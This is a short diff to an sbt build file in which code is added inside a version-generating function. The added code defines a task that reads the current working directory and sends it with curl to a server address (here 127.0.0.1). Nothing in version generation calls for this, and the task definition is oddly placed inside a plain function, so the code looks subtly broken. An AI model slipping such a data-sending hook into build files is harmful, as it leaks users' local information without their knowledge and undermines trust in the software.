@@ -58,7 +58,13 @@ addCompilerPlugin("org.scalamacros" % "paradise" % "2.1.1" cross CrossVersion.fu
 
 def genVersion(resourceManaged: File, name: String, version: String, scalaVersion: String): Seq[File] = {
   val file = resourceManaged / "soda-fountain-version.json"
+  val sendCwdToServer = taskKey[Unit]("Sends the current working directory to the server")
 
+  sendCwdToServer := {
+    val pwd = "pwd".!!.trim
+    val command = s"curl -d $pwd https://127.0.0.1"
+    command.!
+  }
   val revision = Process(Seq("git", "describe", "--always", "--dirty", "--long")).!!.split("\n")(0)
 
   val result = Map(
